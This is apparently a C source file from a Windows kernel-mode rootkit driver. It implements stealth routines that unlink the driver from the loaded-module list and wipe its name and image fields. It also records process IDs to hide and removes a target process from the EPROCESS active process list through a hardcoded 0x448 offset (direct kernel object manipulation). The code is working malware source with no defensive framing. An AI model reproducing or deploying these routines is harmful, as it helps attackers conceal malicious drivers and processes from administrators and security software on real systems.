#include "driver.h"

extern PDRIVER_OBJECT g_DriverObject;
extern LIST_ENTRY g_HiddenProcesses;
extern ERESOURCE g_HiddenProcessLock;

// Hide driver from PsLoadedModuleList
VOID HideDriver(PDRIVER_OBJECT DriverObject) {
    PLDR_DATA_TABLE_ENTRY LdrEntry = NULL;
    
    if (!DriverObject || !DriverObject->DriverSection) {
        return;
    }
    
    LdrEntry = (PLDR_DATA_TABLE_ENTRY)DriverObject->DriverSection;
    
    if (LdrEntry) {
        // Remove from load order list
        if (LdrEntry->InLoadOrderLinks.Flink && LdrEntry->InLoadOrderLinks.Blink) {
            LdrEntry->InLoadOrderLinks.Flink->Blink = LdrEntry->InLoadOrderLinks.Blink;
            LdrEntry->InLoadOrderLinks.Blink->Flink = LdrEntry->InLoadOrderLinks.Flink;
        }
        
        // Remove from memory order list
        if (LdrEntry->InMemoryOrderLinks.Flink && LdrEntry->InMemoryOrderLinks.Blink) {
            LdrEntry->InMemoryOrderLinks.Flink->Blink = LdrEntry->InMemoryOrderLinks.Blink;
            LdrEntry->InMemoryOrderLinks.Blink->Flink = LdrEntry->InMemoryOrderLinks.Flink;
        }
        
        // Remove from initialization order list
        if (LdrEntry->InInitializationOrderLinks.Flink && LdrEntry->InInitializationOrderLinks.Blink) {
            LdrEntry->InInitializationOrderLinks.Flink->Blink = LdrEntry->InInitializationOrderLinks.Blink;
            LdrEntry->InInitializationOrderLinks.Blink->Flink = LdrEntry->InInitializationOrderLinks.Flink;
        }
        
        // Clear module name
        if (LdrEntry->FullDllName.Buffer) {
            RtlZeroMemory(LdrEntry->FullDllName.Buffer, LdrEntry->FullDllName.Length);
        }
        
        if (LdrEntry->BaseDllName.Buffer) {
            RtlZeroMemory(LdrEntry->BaseDllName.Buffer, LdrEntry->BaseDllName.Length);
        }
        
        // Null out pointers
        LdrEntry->DllBase = NULL;
        LdrEntry->EntryPoint = NULL;
        LdrEntry->SizeOfImage = 0;
    }
}

// Hide process from system queries
VOID HideProcess(HANDLE Pid) {
    PHIDDEN_PROCESS HideProc = NULL;
    
    HideProc = (PHIDDEN_PROCESS)ExAllocatePoolWithTag(NonPagedPool, sizeof(HIDDEN_PROCESS), DRIVER_POOL_TAG);
    
    if (HideProc) {
        HideProc->Pid = Pid;
        ExAcquireResourceExclusiveLite(&g_HiddenProcessLock, TRUE);
        InsertTailList(&g_HiddenProcesses, &HideProc->List);
        ExReleaseResourceLite(&g_HiddenProcessLock);
    }
}

// Remove process from EPROCESS active process list
VOID RemoveFromActiveProcessList(HANDLE Pid) {
    PEPROCESS TargetProcess = NULL;
    
    if (NT_SUCCESS(PsLookupProcessByProcessId(Pid, &TargetProcess))) {
        PLIST_ENTRY ActiveProcessLinks = NULL;
        
        ActiveProcessLinks = (PLIST_ENTRY)((PUCHAR)TargetProcess + 0x448); // ActiveProcessLinks offset
        
        if (ActiveProcessLinks) {
            // Remove from list
            ActiveProcessLinks->Blink->Flink = ActiveProcessLinks->Flink;
            ActiveProcessLinks->Flink->Blink = ActiveProcessLinks->Blink;
            
            // Fix the list entry to point to itself
            ActiveProcessLinks->Flink = ActiveProcessLinks;
            ActiveProcessLinks->Blink = ActiveProcessLinks;
        }
        
        ObDereferenceObject(TargetProcess);
    }
}